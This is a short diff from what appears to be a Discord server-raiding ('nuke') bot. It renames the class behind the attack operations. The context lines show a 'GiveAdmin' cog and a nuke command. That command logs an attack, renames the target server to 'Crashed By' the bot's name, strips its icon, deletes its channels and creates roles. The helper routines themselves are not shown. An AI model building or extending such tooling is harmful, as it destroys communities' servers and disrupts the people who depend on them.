@@ -3,7 +3,7 @@ from discord.ext import commands
 from discord.ext.commands import BucketType, CommandOnCooldown
 
 from core.managers.counter import AttackCounter
-from core.operations import Fucker
+from core.operations import Nuke
 from core.config.config import NAME
 
 class GiveAdmin(commands.Cog):
@@ -35,7 +35,7 @@ class Nuke(commands.Cog):
     async def nuke(self, ctx):
         self.attack_counter.record_attack_start()
 
-        fucker = Fucker(ctx)  # Define our mini-api wrapper
+        fucker = Nuke(ctx)  # Define our mini-api wrapper
         await ctx.guild.edit(name=f"Crashed By {NAME}.", icon=None)
         await fucker.delChannels(ctx)
         await fucker.crRoles(ctx)
